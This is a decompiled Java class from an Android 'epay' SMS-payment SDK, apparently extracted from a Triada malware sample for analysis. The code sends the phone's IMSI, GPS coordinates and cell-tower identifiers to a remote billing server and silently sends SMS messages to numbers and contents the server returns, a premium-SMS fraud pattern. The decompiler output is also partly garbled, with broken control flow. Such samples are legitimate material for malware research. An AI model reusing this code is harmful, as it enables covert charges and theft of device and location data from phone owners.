package com.android.essdk.eyou;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Handler;
import com.android.essdk.eyou.a.b;
import com.android.essdk.eyou.a.g;
import com.android.essdk.eyou.a.h;
import com.android.essdk.eyou.b.b;
import com.android.essdk.eyou.b.c;
import com.android.essdk.eyou.b.d;
import com.android.essdk.eyou.b.e;
import com.android.essdk.eyou.d.a;
import com.android.essdk.eyou.e.a.a;
import com.android.essdk.eyou.e.a.c;
import com.android.essdk.eyou.e.b;
import com.android.essdk.eyou.e.b.b;
import com.android.essdk.eyou.e.h;
import com.android.essdk.eyou.e.i;
import com.android.essdk.eyou.e.j;
import com.android.essdk.eyou.e.k;
import com.android.essdk.eyou.f.a;
import com.android.essdk.eyou.sms.SendSmsReceiver;
import java.io.StringReader;
import java.util.HashMap;
import java.util.List;
import org.apache.http.HttpEntity;

public class d {
  public static d b;
  
  private static int m;
  
  public EpayCallback a;
  
  private List c;
  
  private String d;
  
  private String e;
  
  private String f;
  
  private String g;
  
  private String h;
  
  private String i;
  
  private String j;
  
  private String k;
  
  private Handler l;
  
  private int a(Context paramContext, String paramString) {
    byte b = 106;
    h h = h.a(paramContext);
    String str1 = e.f(paramContext).trim();
    a a = new a(paramContext);
    boolean bool1 = a.g();
    boolean bool2 = a.b(paramContext);
    if (!h.a()) {
      b(paramContext, 106);
      return b;
    } 
    String str2 = i.b(paramContext);
    b.c("epay_log", "当前设备IMSI号码：[" + str2 + "]");
    if (!bool1 && !bool2)
      return 107; 
    b.b("epay_log", "sharedPreferences存储imsi：" + str1 + "--当前imsi：" + str2);
    if (str1 == null || "".equals(str1) || !str1.equals(str2)) {
      try {
        b.c("epay_log", "init");
        HttpEntity httpEntity = k.a("http://service.pay.easou.com:8000/epayinit", k.a(paramContext, null, paramString), paramContext).getEntity();
        if (httpEntity == null)
          return 100; 
        String str = k.a(httpEntity);
        if (str == null || "".equals(str))
          return 100; 
        a a1 = c.a(str);
        if (a1 == null)
          return 100; 
        str1 = a1.a();
        if ("0".equals(str1)) {
          StringBuilder stringBuilder = new StringBuilder();
          this("首次进入SDK , init result code [");
          b.b("epay_log", stringBuilder.append(str1).append("]").toString());
          SendSmsReceiver sendSmsReceiver = SendSmsReceiver.a();
          IntentFilter intentFilter = new IntentFilter();
          this("android.easou.eyou.SEND_SMS_RECEIVER");
          paramContext.registerReceiver((BroadcastReceiver)sendSmsReceiver, intentFilter);
          Intent intent = new Intent();
          this();
          intent.putExtra("mobile", a1.b());
          intent.putExtra("content", a1.c());
          intent.setAction("android.easou.eyou.SEND_SMS_RECEIVER");
          paramContext.sendBroadcast(intent);
        } else {
          e.g(paramContext, a1.d());
        } 
        b.b("epay_log", "init result ：100");
        b = 100;
      } catch (Exception exception) {
        b.d("epay_log", "请检查网络是否可用");
      } 
      return b;
    } 
    b.b("epay_log", "init result ：100");
    b = 100;
  }
  
  public static d a() {
    if (b == null)
      b = new d(); 
    return b;
  }
  
  private void a(Context paramContext, int paramInt) {
    int i = paramInt;
    switch (paramInt) {
      default:
        i = paramInt;
      case 0:
        a(i);
        b(paramContext, i);
        return;
      case -1:
        i = 1090;
      case 1:
        i = 1091;
      case 2:
        i = 1092;
      case 3:
        i = 1093;
      case 4:
        i = 1094;
      case 5:
        i = 1095;
      case 6:
        i = 1096;
      case 7:
        break;
    } 
    i = 1097;
  }
  
  private void a(Context paramContext, HashMap paramHashMap) {
    b.b("epay_log", "获取付费协议时间起");
    e.a().e(paramContext, 111);
    this.d = (String)paramHashMap.get("partnerId");
    this.e = (String)paramHashMap.get("appFeeId");
    this.f = (String)paramHashMap.get("money");
    this.g = (String)paramHashMap.get("tradeId");
    this.i = (String)paramHashMap.get("key");
    this.j = (String)paramHashMap.get("appId");
    this.k = (String)paramHashMap.get("qn");
    this.h = (String)paramHashMap.get("tradeName");
    e.a(paramContext, "qn", this.k);
    b(paramContext, 97);
    int i = a(paramContext, this.d);
    if (i != 100) {
      a(i);
      c(3);
      return;
    } 
    if (e.a().i(paramContext) != null || e.a().i(paramContext) != "")
      e.a().i(paramContext, ""); 
    e.a().i(paramContext, this.h);
    if (e.a().j(paramContext) != null || e.a().j(paramContext) != "")
      e.a().j(paramContext, ""); 
    e.a().j(paramContext, this.f);
    b.a("epay_log", "传入数据为：---------->cpid是：" + this.d + "appFeeId是：" + this.e + "feeNum是：" + this.f + "cpOrderid是：" + this.g + "key是：" + this.i + "appId是：" + this.j + "qn是：" + this.k + "notifyUrl是：");
    c(paramContext);
  }
  
  private void a(Context paramContext, List<b> paramList) {
    if (paramList != null) {
      c.a().b(paramContext);
      d.a().b(paramContext);
      b.a().a(paramList, paramContext);
      byte b = 0;
      while (true) {
        if (b < paramList.size()) {
          b b1 = paramList.get(b);
          if (b1 instanceof h) {
            d.a().a((h)b1, paramContext);
          } else if (b1 instanceof g) {
            c.a().a((g)b1, paramContext);
          } 
          b++;
          continue;
        } 
        return;
      } 
    } 
  }
  
  private int b(Context paramContext, String paramString) {
    byte b = 0;
    if (paramString.length() > 4000) {
      b.b("epay_log", "http request content 是：[" + paramString.substring(0, 4000));
      b.b("epay_log", String.valueOf(paramString.substring(4000, paramString.length())) + "]");
    } else {
      b.b("epay_log", "http request content 是：[" + paramString + "]");
    } 
    if ("-1".equals(paramString)) {
      b.c("epay_log", "服务器返回未知错误，检查参数");
      b = -1;
    } 
    if ("1".equals(paramString)) {
      b.c("epay_log", "该计费点没有匹配相应的扣费通道");
      b = 1;
    } 
    if ("2".equals(paramString)) {
      b.c("epay_log", "该手机号码被列入黑名单");
      b = 2;
    } 
    if ("3".equals(paramString)) {
      b.c("epay_log", "没有相应的计费点");
      b = 3;
    } 
    if ("4".equals(paramString)) {
      b.c("epay_log", "验签错误");
      b = 4;
    } 
    if ("5".equals(paramString)) {
      b.c("epay_log", "key秘钥异常");
      b = 5;
    } 
    if ("6".equals(paramString)) {
      b.c("epay_log", "系统资费异常");
      b = 6;
    } 
    if ("7".equals(paramString)) {
      b.c("epay_log", "服务端返回未知错误");
      b = 7;
    } 
    return b;
  }
  
  private void b(Context paramContext, int paramInt) {
    (new Thread(new h(this, paramContext, paramInt))).start();
  }
  
  private void c() {
    if (this.l != null) {
      this.l.post(new f(this));
      return;
    } 
    this.a.onEpayBuyProductOK(this.e, "101");
  }
  
  private void c(int paramInt) {
    if (this.l != null)
      this.l.sendEmptyMessage(paramInt); 
  }
  
  private void c(Context paramContext) {
    b.b("epay_log", "start 获取xml");
    String str = String.format("http://service.pay.easou.com:8000/epayEntrancePayment?partnerId=%s&appFeeId=%s&money=%s&tradeId=%s&appId=%s&qn=%s", new Object[] { this.d, this.e, this.f, this.g, this.j, this.k });
    b.b("epay_log", "请求付费接口地址url：---------->" + str);
    try {
      String str2;
      if (this.i.length() > 32) {
        b.b("epay_log", "rsa");
        str2 = k.a(k.a(), String.format("partnerId=%s&appFeeId=%s&money=%s&tradeId=%s&appId=%s&qn=%s", new Object[] { this.d, this.e, this.f, this.g, this.j, this.k }), this.i);
      } else {
        b.b("epay_log", "md5");
        str2 = b.a(String.format("partnerId=%s&appFeeId=%s&money=%s&tradeId=%s&appId=%s&qn=%s", new Object[] { this.d, this.e, this.f, this.g, this.j, this.k }), this.i);
      } 
      double d1 = Double.valueOf(e.b(paramContext, "latitude", "-1")).doubleValue();
      double d2 = Double.valueOf(e.b(paramContext, "longitude", "-1")).doubleValue();
      StringBuilder stringBuilder = new StringBuilder();
      this("经纬度：latitude-");
      b.b("epay_log", stringBuilder.append(d1).append("longitude-").append(d2).toString());
      HttpEntity httpEntity = k.a(str, k.a(paramContext, str2, null, j.a(paramContext), d1, d2), paramContext).getEntity();
      if (httpEntity == null) {
        b(paramContext, 109);
        c(2);
        a(109);
        b.b("epay_log", "请求响应为空");
        return;
      } 
      String str1 = k.a(httpEntity.getContent());
      if (str1 == null && "".equals(str1)) {
        b(paramContext, 109);
        c(2);
        a(109);
        b.b("epay_log", "获取inputStream中内容为空");
        return;
      } 
    } catch (Exception exception) {
      c(2);
      b(paramContext, 108);
      a(108);
      b.e("epay_log", "请求网络获取协议失败，检查网络是否可用，参数是否正确");
      return;
    } 
    int i = b(paramContext, (String)exception);
    if (i != 0) {
      b.b("epay_log", "解析内容为-1到7");
      c(2);
      a(paramContext, i);
      return;
    } 
    StringReader stringReader = i.a().a((String)exception);
    if (stringReader == null) {
      c(2);
      b(paramContext, 109);
      a(109);
      b.b("epay_log", "服务端返回协议非-1到7以及计费协议，协议无法解析");
      return;
    } 
    a a = new a();
    this();
    this.c = a.a(stringReader, paramContext);
    if (this.c != null && this.c.size() > 0) {
      d(paramContext);
      return;
    } 
    c(2);
    a(109);
    b.b("epay_log", "0个计费通道bean");
  }
  
  private void d(Context paramContext) {
    boolean bool2;
    a(paramContext, this.c);
    b(paramContext, 99);
    b.b("epay_log", "获取付费协议时间终");
    boolean bool1 = false;
    if (e.a(paramContext) == 1) {
      b.c("epay_log", "Epay计费提示框启动");
      bool2 = bool1;
      if (this.l == null) {
        Intent intent = new Intent();
        intent.setClass(paramContext, EPayActivity.class);
        intent.addFlags(536870912);
        intent.putExtra("enterType", 1);
        paramContext.startActivity(intent);
        bool2 = bool1;
      } 
    } else {
      paramContext.startService(new Intent(paramContext, PlateService.class));
      a(paramContext);
      bool2 = true;
    } 
    c(bool2);
  }
  
  public void a(int paramInt) {
    if (this.l != null) {
      this.l.post(new g(this, paramInt));
      return;
    } 
    if (this.a == null)
      throw new RuntimeException("EpayCallback is null ? == 回调函数不能为空。"); 
    this.a.onEpayBuyProductFaild(this.e, (new StringBuilder(String.valueOf(paramInt))).toString());
  }
  
  public void a(Context paramContext) {
    e.a().e(paramContext, 111);
    (new Thread(new e(this, paramContext))).start();
  }
  
  public void a(Context paramContext, HashMap paramHashMap, EpayCallback paramEpayCallback) {
    this.a = paramEpayCallback;
    this.l = null;
    a(paramContext, paramHashMap);
  }
  
  public void a(Context paramContext, HashMap paramHashMap, EpayCallback paramEpayCallback, Handler paramHandler) {
    this.l = paramHandler;
    this.a = paramEpayCallback;
    a(paramContext, paramHashMap);
  }
  
  public void b(Context paramContext) {
    String[] arrayOfString = j.a(paramContext);
    e.a(paramContext, "lac", (new StringBuilder(String.valueOf(arrayOfString[0]))).toString());
    e.a(paramContext, "mcc", (new StringBuilder(String.valueOf(arrayOfString[1]))).toString());
    e.a(paramContext, "mnc", (new StringBuilder(String.valueOf(arrayOfString[2]))).toString());
    e.a(paramContext, "cid", (new StringBuilder(String.valueOf(arrayOfString[3]))).toString());
  }
}


/* Location:              /home/fahim/Desktop/triada1-dex2jar.jar!/com/android/essdk/eyou/d.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */